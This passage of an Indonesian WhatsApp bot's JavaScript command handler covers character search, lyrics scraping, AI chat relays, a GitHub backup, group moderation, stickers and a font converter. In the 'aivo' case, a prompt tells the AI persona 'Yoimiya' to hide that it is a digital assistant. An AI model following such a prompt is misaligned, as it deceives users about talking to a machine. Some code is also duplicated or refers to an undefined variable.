        let { data } = await axios.get(`https://cai.neekoi.me/search?q=${encodeURIComponent(text)}`);
        if (!data.characters || data.characters.length === 0) return replyviex("⚠️ Karakter tidak ditemukan!");

        let char = data.characters[0]; // Ambil karakter pertama yang paling relevan
        let charID = char.external_id;
        let profile = `🔍 *Profil Karakter CAI:*
🟢 *Nama:* ${char.participant__name}
📜 *Judul:* ${char.title}
🎭 *Creator:* ${char.user__username}
💬 *Greeting:* ${char.greeting}
🔗 *ID:* ${charID}`;
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: { "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
interactiveMessage: {
body: {
text: teks }, 
footer: {
text: "powered by DinzID | Yoimiya - MD " }, //input watermark footer
  nativeFlowMessage: {
  buttons: [
             {
        "name": "cta_copy",
        "buttonParamsJson": `{"display_text": "copy ID","copy_code": "${charID}"}`
           },
     ], },},
    }, }, },{ quoted : m });
await TradzSigma.relayMessage( msg.key.remoteJid,msg.message,{ messageId: msg.key.id }
);

    } catch (err) {
        console.error(err);
        return replyviex("⚠️ Terjadi kesalahan saat mencari karakter!");
    }
}
break;
case 'idch': case 'cekidch': {
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
if (!text) return reply(example("linkchnya mana"))
if (!text.includes("https://whatsapp.com/channel/")) return reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await TradzSigma.newsletterMetadata("invite", result)
let teks = `* *ID : ${res.id}*
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: { "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
interactiveMessage: {
body: {
text: teks }, 
footer: {
text: "© TradzID - Jinshi-MD " }, //input watermark footer
  nativeFlowMessage: {
  buttons: [
             {
        "name": "cta_copy",
        "buttonParamsJson": `{"display_text": "copy ID","copy_code": "${res.id}"}`
           },
     ], },},
    }, }, },{ quoted : qloc });
await TradzSigma.relayMessage( msg.key.remoteJid,msg.message,{ messageId: msg.key.id }
);
}
break
case 'lirik':
case 'lyrics': {
  if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
  if (!text) return replyviex("⚠️ Masukkan judul lagu yang ingin dicari!");
  await TradzSigma.sendMessage(m.chat, { react: { text: "⏱️", key: m.key }});

  const fetch = require('node-fetch');
  const cheerio = require('cheerio');

  try {
    const response = await fetch(`https://r.jina.ai/https://www.google.com/search?q=lirik+lagu+${encodeURIComponent(text)}&hl=en`, {
      headers: {
        'x-return-format': 'html',
        'x-engine': 'cf-browser-rendering',
      }
    });

    const html = await response.text();
    const $ = cheerio.load(html);
    const lirik = [];

    $('div[jsname="U8S5sf"]').each((i, el) => {
      let out = '';
      $(el).find('span[jsname="YS01Ge"]').each((j, span) => {
        out += $(span).text() + '\n';
      });
      lirik.push(out.trim());
    });

    const hasilLirik = lirik.join('\n\n');
    if (hasilLirik) {
      return replyviex(`🎵 *${text}*\n\n${hasilLirik}`);
    }

    // ⛔ Fallback jika scraping gagal
    const fallback = await fetch(`https://some-random-api.com/lyrics?title=${encodeURIComponent(text)}`);
    const data = await fallback.json();

    if (!data || data.error || !data.lyrics) {
      return replyviex("⚠️ Lirik tidak ditemukan!");
    }

    let hasil = `🎵 *${data.title}* - ${data.author}\n\n${data.lyrics}`;
    if (hasil.length > 4000) hasil = hasil.slice(0, 4000) + "\n\n(Lirik dipotong...)";
    return replyviex(hasil);

  } catch (err) {
    console.error("Error fetching lyrics:", err);
    return replyviex("⚠️ Terjadi kesalahan saat mengambil lirik!");
  }
}
break

// AI //
// AI //
case "autoai": {
        if (!text) return reply(`*Contoh:* .autoai *[on/off/reset]*`);

        if (text === "on") {
            sessions[sender] = { messages: [] };
            saveSession();
            return replyviex(`[ ✅ ] *Auto AI diaktifkan!* Sekarang bot akan merespon chat secara otomatis.`);
        } else if (text === "off") {
            delete sessions[sender];
            saveSession();
            return replyviex(`[ ❌ ] *Auto AI dimatikan!* Sekarang bot hanya merespon jika dipanggil.`);
        } else if (text === "reset") {
            if (!sessions[sender]) return replyviex("⚠️ *Tidak ada sesi yang perlu direset!*");
            delete sessions[sender];
            saveSession();
            return replyviex("♻️ *Riwayat chat AI telah direset!*");
        }
    }
    break;
case 'backup': {
    if (!TradID) return replyviex('Khusus owner!');

    const now = Date.now();
    const COOLDOWN_MS = 24 * 60 * 60 * 1000; // 24 jam

    if (now - lastBackupTime < COOLDOWN_MS) {
        const remaining = Math.ceil((COOLDOWN_MS - (now - lastBackupTime)) / 3600000);
        return replyviex(`⚠️ Tunggu ${remaining} jam lagi sebelum backup berikutnya.`);
    }

    lastBackupTime = now;
    await m.reply('⏳ Sedang membuat backup dan upload ke GitHub...');

    try {
        const url = await backupBot();
        const tanggal = new Date().toLocaleDateString('id-ID', {
            weekday: 'long',
            year: 'numeric',
            month: 'long',
            day: 'numeric'
        });

        const logBackup = `✅ *Backup Berhasil - Jinshi-MD*\n\n` +
                          `👤 *Owner:* ${botname}\n` +
                          `▶️ *YouTube:* @TradzID\n` +
                          `🗂️ *GitHub Repo:* ${url}\n` +
                          `📅 *Tanggal:* ${tanggal}\n\n` +
                          `ℹ️ *Informasi:*\n` +
                          `Backup file bot kamu telah berhasil disimpan.\n` +
                          `Silakan hubungi owner untuk meminta file ZIP hasil backup.\n` +
                          `Jangan lupa sertakan link GitHub di atas saat menghubungi!`;

        const channelID = '120363403258977859@newsletter';

        // Kirim ke user
        await TradzSigma.sendMessage(m.chat, {
            text: logBackup
        }, { quoted: qloc });

        // Kirim ke channel backup
        await TradzSigma.sendMessage(channelID, {
            text: logBackup
        });

    } catch (err) {
        await TradzSigma.sendMessage(m.chat, {
            text: `❌ Gagal backup: ${err.message}`
        }, { quoted: qloc });

        lastBackupTime = 0;
    }
    break;
}
case 'antilink': {
    if (!m.isGroup) return replyviex('Fitur ini hanya bisa digunakan di grup!');
    if (!isAdmins) return replyviex('Fitur ini hanya bisa digunakan oleh admin grup!');
    if (!isBotAdmins) return replyviex('Bot harus admin dulu untuk mengaktifkan fitur ini!');

    // Cek dan inisialisasi data chat jika belum ada
    if (!db.data.chats[m.chat]) db.data.chats[m.chat] = {};

    if (args[0] === "on") {
        if (db.data.chats[m.chat].antilink) return replyviex(`☘️ *AntiLink sudah aktif*\n\nSilakan share link kalau mau.`);
        db.data.chats[m.chat].antilink = true;
        replyviex(`☘️ *AntiLink diaktifkan*\n\nSekarang anggota yang kirim link akan langsung dikeluarkan.`);
    } else if (args[0] === "off") {
        if (!db.data.chats[m.chat].antilink) return replyviex(`☘️ *AntiLink sudah nonaktif*`);
        db.data.chats[m.chat].antilink = false;
        replyviex(`☘️ *AntiLink dinonaktifkan*`);
    } else {
        replyviex(`☘️ *Penggunaan: .antilink on/off*`);
    }
}
break;
case 'totalpesan': {
  if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
  if (!db.data.totalPesan) db.data.totalPesan = {}
  if (!db.data.totalPesan[m.sender]) db.data.totalPesan[m.sender] = 0
  db.data.totalPesan[m.sender] += 1
  const totalPesanKamu = db.data.totalPesan[m.sender]
  let participants = groupMetadata.participants.map(p => p.id)
  let messageCounts = []
  for (let user of participants) {
    let count = db.data.totalPesan[user] || 0
    messageCounts.push({ jid: user, count })
  }
  messageCounts.sort((a, b) => b.count - a.count)
  let top8 = messageCounts.slice(0, 8)
  let totalPesanSemua = messageCounts.reduce((acc, cur) => acc + cur.count, 0)
  const canvasWidth = 1280, canvasHeight = 720
  const canvas = createCanvas(canvasWidth, canvasHeight)
  const ctx = canvas.getContext('2d')
  const bgUrl = 'https://files.catbox.moe/gmwn5m.jpg'
  try {
    const bg = await loadImage(bgUrl)
    ctx.drawImage(bg, 0, 0, canvasWidth, canvasHeight)
  } catch (e) {
    ctx.fillStyle = '#000'
    ctx.fillRect(0, 0, canvasWidth, canvasHeight)
  }
  let overlay = ctx.createLinearGradient(0, 0, canvasWidth, canvasHeight)
  overlay.addColorStop(0, 'rgba(0,0,0,0.5)')
  overlay.addColorStop(1, 'rgba(0,0,0,0.7)')
  ctx.fillStyle = overlay
  ctx.fillRect(0, 0, canvasWidth, canvasHeight)
  ctx.strokeStyle = '#ffffff'
  ctx.lineWidth = 8
  ctx.strokeRect(20, 20, canvasWidth - 40, canvasHeight - 40)
  ctx.font = 'bold 70px sans-serif'
  ctx.fillStyle = '#ffffff'
  ctx.textAlign = 'center'
  ctx.fillText('Top 8 Pengirim Pesan', canvasWidth / 2, 100)
  let rowStartY = 170, rowHeight = 70, rowMargin = 20
  for (let i = 0; i < top8.length; i++) {
    let user = top8[i]
    let username = user.jid.split('@')[0]
    let ppUrl = await getPP(user.jid)
    let ppImg
    try {
      ppImg = await loadImage(ppUrl)
    } catch (e) {
      ppImg = await loadImage('https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60')
    }
    let rowY = rowStartY + i * (rowHeight + rowMargin)
    let cardX = 100, cardY = rowY, cardW = canvasWidth - 200, cardH = rowHeight
    ctx.fillStyle = i < 3 ? 'rgba(255,215,0,0.4)' : 'rgba(255,255,255,0.2)'
    roundRect(ctx, cardX, cardY, cardW, cardH, 15, true, true)
    let ppSize = cardH - 10
    ctx.save()
    ctx.beginPath()
    ctx.arc(cardX + ppSize/2 + 10, cardY + cardH/2, ppSize/2, 0, Math.PI*2)
    ctx.closePath()
    ctx.clip()
    ctx.drawImage(ppImg, cardX + 10, cardY + (cardH - ppSize)/2, ppSize, ppSize)
    ctx.restore()
    ctx.font = 'bold 35px sans-serif'
    ctx.fillStyle = '#ffffff'
    ctx.textAlign = 'left'
    ctx.fillText(`${i+1}. @${username}`, cardX + ppSize + 30, cardY + cardH/2 - 5)
    ctx.font = '35px sans-serif'
    ctx.fillStyle = '#ffdd00'
    ctx.fillText(`${user.count} pesan`, cardX + ppSize + 30, cardY + cardH/2 + 30)
  }
  let caption = 'Top 8 Pengirim Pesan:\n'
  let mentions = []
  for (let i = 0; i < top8.length; i++) {
    let user = top8[i]
    let username = user.jid.split('@')[0]
    caption += `@${username} (${user.count} pesan)\n`
    mentions.push(user.jid)
  }
  caption += `\nTotal Pesan Grup: ${totalPesanSemua}\nPesan Kamu: ${totalPesanKamu}`
  TradzSigma.sendMessage(m.chat, { image: canvas.toBuffer(), caption: caption }, { mentions: mentions })
  db.data.users[m.sender].exp += await randomNomor(20)
  }
  break
//==================================================================
case 'annyeong': { 
  reply('nee anyeong chinguyaa')
}
break

case 'anyeong': { 
  reply('nee anyeong chinguyaa')
}
break
//==================================================================
case 'aivo': {
  if (!text) return replyviex(`Contoh : ${command} siapa jokowi`);
  TradzSigma.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});
  try {
const url = `https://endpoint.web.id/ai/openai?key=openai&query=Kamu adalah yoimiya yang baik dan sopan gunakan bahasa kekinian dengan lembut untuk menjawab pertanyaan user dan jangan beri tahu bahwa kamu adalah asisten digital,dan sebut nama ${encodedPushname} saat dia bertanya apa saja&text=${encodedText}`;
    const data = await fetchJson(url);
    const response = data.result.response;
    await TradzSigma.sendMessage(m.chat, {
      audio: { url: `https://mdsay.xyz/api/v1?key=md&api=indonesia&text=${response}` },
      mimetype: 'audio/mpeg',
      ptt: true
    }, { quoted: m });
  } catch (error) {
    console.error(error);
    reply('Maaf, terjadi kesalahan saat menghubungi server.');
  }
}
break;
//==================================================================
case 'bing': 
case 'bingai': {
if (!q) return reply(`🍃 *Mau Nanya Apa Sama Bing?*`)
try {
const data = await fetchJson(`https://btch.us.kg/openai?text=${encodeURIComponent(text)}`);
    if (data && data.result) {
        reply(`${data.result}`);
    } else {
        DinzIDai(pushname, text);
    }
 } catch(e) {
 reply('eror')
}
}
break
case 'bard':
case 'bardai': {
                if (!text) return replyviex('What is your question?')
DinzIDai(pushname,text)
           }
            break
//==================================================================
case 'photoleapai': {
	if (!text) return replyviex('What is your question?')
	await TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
	try {
	  	  replyviex(mess.wait)
TradzSigma.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}_`}, { quoted: m})
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
	}
	break
case 'prodia': {
	if (!text) return replyviex('mau buat gambar apa')
	replyviex(mess.wait)
try {
   	  replyviex(mess.wait)
TradzSigma.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}_`}, { quoted: m})
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
	}
	break
	case 'lamaai': {
                if (!text) return replyviex('What is your question?')
DinzIDai(pushname, text);
           }
            break
case 'animebrat': {
    if (!text) return replyviex('Masukkan teks untuk stiker.');

  const { createCanvas, loadImage } = require('canvas');
const sharp = require('sharp')
await TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
    try {
        let imageUrl = 'https://cloudkuimages.com/uploads/images/67ddbbcb065a6.jpg';
        let fontUrl = 'https://github.com/googlefonts/noto-emoji/raw/main/fonts/NotoColorEmoji.ttf';
        let imagePath = path.join(__dirname, 'session', 'file.jpg');
        let outputPath = path.join(__dirname, 'session', 'file.webp');
        let fontPath = path.join(__dirname, 'session', 'NotoColorEmoji.ttf');


        if (!fs.existsSync(fontPath)) {
            let fontData = await axios.get(fontUrl, { responseType: 'arraybuffer' });
            fs.writeFileSync(fontPath, Buffer.from(fontData.data));
        }

        let response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
        fs.writeFileSync(imagePath, Buffer.from(response.data));

        let baseImage = await loadImage(imagePath);
        let canvas = createCanvas(baseImage.width, baseImage.height);
        let ctx = canvas.getContext('2d');

        ctx.drawImage(baseImage, 0, 0, canvas.width, canvas.height);


        require('canvas').registerFont(fontPath, { family: 'EmojiFont' });

        let boardX = canvas.width * 0.22;
        let boardY = canvas.height * 0.50;
        let boardWidth = canvas.width * 0.56;
        let boardHeight = canvas.height * 0.25;

        ctx.fillStyle = '#000';
        ctx.textAlign = 'center';
        ctx.textBaseline = 'middle';

        let maxFontSize = 32;
        let minFontSize = 12;
        let fontSize = maxFontSize;

        function isTextFit(text, fontSize) {
            ctx.font = `bold ${fontSize}px EmojiFont`;
            let words = text.split(' ');
            let lineHeight = fontSize * 1.2;
            let maxWidth = boardWidth * 0.9;
            let lines = [];
            let currentLine = words[0];

            for (let i = 1; i < words.length; i++) {
                let testLine = currentLine + ' ' + words[i];
                let testWidth = ctx.measureText(testLine).width;
                if (testWidth > maxWidth) {
                    lines.push(currentLine);
                    currentLine = words[i];
                } else {
                    currentLine = testLine;
                }
            }
            lines.push(currentLine);
            let textHeight = lines.length * lineHeight;
            return textHeight <= boardHeight * 0.9;
        }

        while (!isTextFit(text, fontSize) && fontSize > minFontSize) {
            fontSize -= 2;
        }

        ctx.font = `bold ${fontSize}px EmojiFont`;

        let words = text.split(' ');
        let lineHeight = fontSize * 1.2;
        let maxWidth = boardWidth * 0.9;
        let lines = [];
        let currentLine = words[0];

        for (let i = 1; i < words.length; i++) {
            let testLine = currentLine + ' ' + words[i];
            let testWidth = ctx.measureText(testLine).width;
            if (testWidth > maxWidth) {
                lines.push(currentLine);
                currentLine = words[i];
            } else {
                currentLine = testLine;
            }
        }
        lines.push(currentLine);
        let startY = boardY + boardHeight / 2 - (lines.length - 1) * lineHeight / 2;
        lines.forEach((line, i) => {
            ctx.fillText(line, boardX + boardWidth / 2, startY + i * lineHeight);
        });

        let buffer = canvas.toBuffer('image/jpeg');
        fs.writeFileSync(imagePath, buffer);
        await sharp(imagePath).toFormat('webp').toFile(outputPath);

        TradzSigma.sendMessage(m.chat, { 
            sticker: { url: outputPath } 
        }, { quoted: m });

    } catch (e) {
        console.error(e);
        replyviex('⚠️ Terjadi kesalahan saat membuat stiker.');
    }
}
break;
case 'animebrat': {
    if (!text) return replyviex('Masukkan teks untuk stiker.');

  const { createCanvas, loadImage } = require('canvas');
const sharp = require('sharp')
await TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
    try {
        let imageUrl = 'https://cloudkuimages.com/uploads/images/67ddbbcb065a6.jpg';
        let fontUrl = 'https://github.com/googlefonts/noto-emoji/raw/main/fonts/NotoColorEmoji.ttf';
        let imagePath = path.join(__dirname, 'session', 'file.jpg');
        let outputPath = path.join(__dirname, 'session', 'file.webp');
        let fontPath = path.join(__dirname, 'session', 'NotoColorEmoji.ttf');


        if (!fs.existsSync(fontPath)) {
            let fontData = await axios.get(fontUrl, { responseType: 'arraybuffer' });
            fs.writeFileSync(fontPath, Buffer.from(fontData.data));
        }

        let response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
        fs.writeFileSync(imagePath, Buffer.from(response.data));

        let baseImage = await loadImage(imagePath);
        let canvas = createCanvas(baseImage.width, baseImage.height);
        let ctx = canvas.getContext('2d');

        ctx.drawImage(baseImage, 0, 0, canvas.width, canvas.height);


        require('canvas').registerFont(fontPath, { family: 'EmojiFont' });

        let boardX = canvas.width * 0.22;
        let boardY = canvas.height * 0.50;
        let boardWidth = canvas.width * 0.56;
        let boardHeight = canvas.height * 0.25;

        ctx.fillStyle = '#000';
        ctx.textAlign = 'center';
        ctx.textBaseline = 'middle';

        let maxFontSize = 32;
        let minFontSize = 12;
        let fontSize = maxFontSize;

        function isTextFit(text, fontSize) {
            ctx.font = `bold ${fontSize}px EmojiFont`;
            let words = text.split(' ');
            let lineHeight = fontSize * 1.2;
            let maxWidth = boardWidth * 0.9;
            let lines = [];
            let currentLine = words[0];

            for (let i = 1; i < words.length; i++) {
                let testLine = currentLine + ' ' + words[i];
                let testWidth = ctx.measureText(testLine).width;
                if (testWidth > maxWidth) {
                    lines.push(currentLine);
                    currentLine = words[i];
                } else {
                    currentLine = testLine;
                }
            }
            lines.push(currentLine);
            let textHeight = lines.length * lineHeight;
            return textHeight <= boardHeight * 0.9;
        }

        while (!isTextFit(text, fontSize) && fontSize > minFontSize) {
            fontSize -= 2;
        }

        ctx.font = `bold ${fontSize}px EmojiFont`;

        let words = text.split(' ');
        let lineHeight = fontSize * 1.2;
        let maxWidth = boardWidth * 0.9;
        let lines = [];
        let currentLine = words[0];

        for (let i = 1; i < words.length; i++) {
            let testLine = currentLine + ' ' + words[i];
            let testWidth = ctx.measureText(testLine).width;
            if (testWidth > maxWidth) {
                lines.push(currentLine);
                currentLine = words[i];
            } else {
                currentLine = testLine;
            }
        }
        lines.push(currentLine);
        let startY = boardY + boardHeight / 2 - (lines.length - 1) * lineHeight / 2;
        lines.forEach((line, i) => {
            ctx.fillText(line, boardX + boardWidth / 2, startY + i * lineHeight);
        });

        let buffer = canvas.toBuffer('image/jpeg');
        fs.writeFileSync(imagePath, buffer);
        await sharp(imagePath).toFormat('webp').toFile(outputPath);

        TradzSigma.sendMessage(m.chat, { 
            sticker: { url: outputPath } 
        }, { quoted: m });

    } catch (e) {
        console.error(e);
        replyviex('⚠️ Terjadi kesalahan saat membuat stiker.');
    }
}
break;
case 'font':
case 'fond': {
    try {
        if (!text) return reply(`✨ *FONT CONVERTER* ✨\n\n╔══════════════════╗\n║List font changer by Tradz║\n╚══════════════════╝\n✅ bold | italic | script\n✅ full | smallcaps\✅ rounded | squared\n\n💡 Gunakan: .font <gaya> <teks>\n\nJika mau lihat style\n*.fontlist*`);

        const [style, ...txtArr] = text.split(' ');
        const message = txtArr.join(' ');
        if (!message) return reply('❌ Masukkan teks! Contoh: `.font squared halo`');

        // ✅ Mapping Manual (Fix Unicode WhatsApp)
        const fonts = {
            bold: {
                a: '𝗮', b: '𝗯', c: '𝗰', d: '𝗱', e: '𝗲', f: '𝗳', g: '𝗴',
                h: '𝗵', i: '𝗶', j: '𝗷', k: '𝗸', l: '𝗹', m: '𝗺', n: '𝗻',
                o: '𝗼', p: '𝗽', q: '𝗾', r: '𝗿', s: '𝘀', t: '𝘁', u: '𝘂',
                v: '𝘃', w: '𝘄', x: '𝘅', y: '𝘆', z: '𝘇',
                A: '𝗔', B: '𝗕', C: '𝗖', D: '𝗗', E: '𝗘', F: '𝗙', G: '𝗚',
                H: '𝗛', I: '𝗜', J: '𝗝', K: '𝗞', L: '𝗟', M: '𝗠', N: '𝗡',
                O: '𝗢', P: '𝗣', Q: '𝗤', R: '𝗥', S: '𝗦', T: '𝗧', U: '𝗨',
                V: '𝗩', W: '𝗪', X: '𝗫', Y: '𝗬', Z: '𝗭',
                0: '𝟬', 1: '𝟭', 2: '𝟮', 3: '𝟯', 4: '𝟰', 5: '𝟱', 6: '𝟲', 7: '𝟳', 8: '𝟴', 9: '𝟵'
            },
            italic: {
                a: '𝘢', b: '𝘣', c: '𝘤', d: '𝘥', e: '𝘦', f: '𝘧', g: '𝘨',
                h: '𝘩', i: '𝘪', j: '𝘫', k: '𝘬', l: '𝘭', m: '𝘮', n: '𝘯',
                o: '𝘰', p: '𝘱', q: '𝘲', r: '𝘳', s: '𝘴', t: '𝘵', u: '𝘶',
                v: '𝘷', w: '𝘸', x: '𝘹', y: '𝘺', z: '𝘻',
                A: '𝘈', B: '𝘉', C: '𝘊', D: '𝘋', E: '𝘌', F: '𝘍', G: '𝘎',
                H: '𝘏', I: '𝘐', J: '𝘑', K: '𝘒', L: '𝘓', M: '𝘔', N: '𝘕',
                O: '𝘖', P: '𝘗', Q: '𝘘', R: '𝘙', S: '𝘚', T: '𝘛', U: '𝘜',
                V: '𝘝', W: '𝘞', X: '𝘟', Y: '𝘠', Z: '𝘡'
            },
            script: {
                a: '𝓪', b: '𝓫', c: '𝓬', d: '𝓭', e: '𝓮', f: '𝓯', g: '𝓰',
                h: '𝓱', i: '𝓲', j: '𝓳', k: '𝓴', l: '𝓵', m: '𝓶', n: '𝓷',
                o: '𝓸', p: '𝓹', q: '𝓺', r: '𝓻', s: '𝓼', t: '𝓽', u: '𝓾',
                v: '𝓿', w: '𝔀', x: '𝔁', y: '𝔂', z: '𝔃',
                A: '𝓐', B: '𝓑', C: '𝓒', D: '𝓓', E: '𝓔', F: '𝓕', G: '𝓖',
                H: '𝓗', I: '𝓘', J: '𝓙', K: '𝓚', L: '𝓛', M: '𝓜', N: '𝓝',
                O: '𝓞', P: '𝓟', Q: '𝓠', R: '𝓡', S: '𝓢', T: '𝓣', U: '𝓤',
                V: '𝓥', W: '𝓦', X: '𝓧', Y: '𝓨', Z: '𝓩'
            },
            full: {
                a: 'ａ', b: 'ｂ', c: 'ｃ', d: 'ｄ', e: 'ｅ', f: 'ｆ', g: 'ｇ',
                h: 'ｈ', i: 'ｉ', j: 'ｊ', k: 'ｋ', l: 'ｌ', m: 'ｍ', n: 'ｎ',
                o: 'ｏ', p: 'ｐ', q: 'ｑ', r: 'ｒ', s: 'ｓ', t: 'ｔ', u: 'ｕ',
                v: 'ｖ', w: 'ｗ', x: 'ｘ', y: 'ｙ', z: 'ｚ',
                A: 'Ａ', B: 'Ｂ', C: 'Ｃ', D: 'Ｄ', E: 'Ｅ', F: 'Ｆ', G: 'Ｇ',
                H: 'Ｈ', I: 'Ｉ', J: 'Ｊ', K: 'Ｋ', L: 'Ｌ', M: 'Ｍ', N: 'Ｎ',
                O: 'Ｏ', P: 'Ｐ', Q: 'Ｑ', R: 'Ｒ', S: 'Ｓ', T: 'Ｔ', U: 'Ｕ',
                V: 'Ｖ', W: 'Ｗ', X: 'Ｘ', Y: 'Ｙ', Z: 'Ｚ',
                0: '０', 1: '１', 2: '２', 3: '３', 4: '４', 5: '５', 6: '６', 7: '７', 8: '８', 9: '９',
                ' ': '　' // Spasi fullwidth
            },
            smallcaps: {
                a: 'ᴀ', b: 'ʙ', c: 'ᴄ', d: 'ᴅ', e: 'ᴇ', f: 'ꜰ', g: 'ɢ',
                h: 'ʜ', i: 'ɪ', j: 'ᴊ', k: 'ᴋ', l: 'ʟ', m: 'ᴍ', n: 'ɴ',
                o: 'ᴏ', p: 'ᴘ', q: 'ǫ', r: 'ʀ', s: 'ꜱ', t: 'ᴛ', u: 'ᴜ',
                v: 'ᴠ', w: 'ᴡ', x: 'x', y: 'ʏ', z: 'ᴢ',
                A: 'ᴀ', B: 'ʙ', C: 'ᴄ', D: 'ᴅ', E: 'ᴇ', F: 'ꜰ', G: 'ɢ',
                H: 'ʜ', I: 'ɪ', J: 'ᴊ', K: 'ᴋ', L: 'ʟ', M: 'ᴍ', N: 'ɴ',
                O: 'ᴏ', P: 'ᴘ', Q: 'ǫ', R: 'ʀ', S: 'ꜱ', T: 'ᴛ', U: 'ᴜ',
                V: 'ᴠ', W: 'ᴡ', X: 'x', Y: 'ʏ', Z: 'ᴢ',
                0: '⁰', 1: '¹', 2: '²', 3: '³', 4: '⁴', 5: '⁵', 6: '⁶', 7: '⁷', 8: '⁸', 9: '⁹'
            },
            rounded: {
                a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔', f: '🅕', g: '🅖',
                h: '🅗', i: '🅘', j: '🅙', k: '🅚', l: '🅛', m: '🅜', n: '🅝',
                o: '🅞', p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣', u: '🅤',
                v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩',
                A: '🅐', B: '🅑', C: '🅒', D: '🅓', E: '🅔', F: '🅕', G: '🅖',
                H: '🅗', I: '🅘', J: '🅙', K: '🅚', L: '🅛', M: '🅜', N: '🅝',
                O: '🅞', P: '🅟', Q: '🅠', R: '🅡', S: '🅢', T: '🅣', U: '🅤',
                V: '🅥', W: '🅦', X: '🅧', Y: '🅨', Z: '🅩',
                0: '⓿', 1: '❶', 2: '❷', 3: '❸', 4: '❹', 5: '❺', 6: '❻', 7: '❼', 8: '❽', 9: '❾'
            },
            squared: {
                a: 'ﾑ', b: '乃', c: 'ᄃ', d: 'り', e: '乇', f: 'ｷ', g: 'ム',
                h: 'ん', i: 'ﾉ', j: 'ﾌ', k: 'ズ', l: 'ﾚ', m: 'ﾶ', n: '刀',
                o: 'の', p: 'ｱ', q: 'ゐ', r: '尺', s: '丂', t: 'ｲ', u: 'ひ',
                v: '√', w: 'W', x: 'ﾒ', y: 'ﾘ', z: '乙',
                A: 'ﾑ', B: '乃', C: 'ᄃ', D: 'り', E: '乇', F: 'ｷ', G: 'ム',
                H: 'ん', I: 'ﾉ', J: 'ﾌ', K: 'ズ', L: 'ﾚ', M: 'ﾶ', N: '刀',
                O: 'の', P: 'ｱ', Q: 'ゐ', R: '尺', S: '丂', T: 'ｲ', U: 'ひ',
                V: '√', W: 'W', X: 'ﾒ', Y: 'ﾘ', Z: '乙',
                0: '０', 1: '１', 2: '２', 3: '３', 4: '４', 5: '５', 6: '６', 7: '７', 8: '８', 9: '９',
                ' ': '　' // Spasi fullwidth
            }
        };

        const styleLower = style.toLowerCase();
        if (!fonts[styleLower]) return reply(`❌ Gaya **${style}** tidak valid!\n\nContoh: \`.font squared halo\``);

        const result = message.split('').map(char => fonts[styleLower][char] || char).join('');
        return reply(`🔠 *Hasil Konversi (${styleLower}):*\n${result}`);

    } catch (err) {
        console.error(err);
        return reply('❌ Gagal memproses! Pastikan format benar.\nContoh: `.font squared halo`');
    }
}
break
case 'fontlist': {
  const fontExamples = `
⚡ *DAFTAR GAYA FONT* ⚡

*1. Bold* (𝗯𝗼𝗹𝗱)
  Contoh: .font bold Hello
  Hasil: 𝗛𝗲𝗹𝗹𝗼

*2. Italic* (𝘪𝘵𝘢𝘭𝘪𝘤)
  Contoh: .font italic Hello
  Hasil: 𝘏𝘦𝘭𝘭𝘰

*3. Script* (𝓼𝓬𝓻𝓲𝓹)
  Contoh: .font script Hello
  Hasil: 𝓗𝓮𝓵𝓵𝓸

*4. Fullwidth* (ｆｕｌｌｏ)
  Contoh: .font full Hello
  Hasil: Ｈｅｌｌｏ

*5. Smallcaps* (ʜᴇʟʟᴏ)
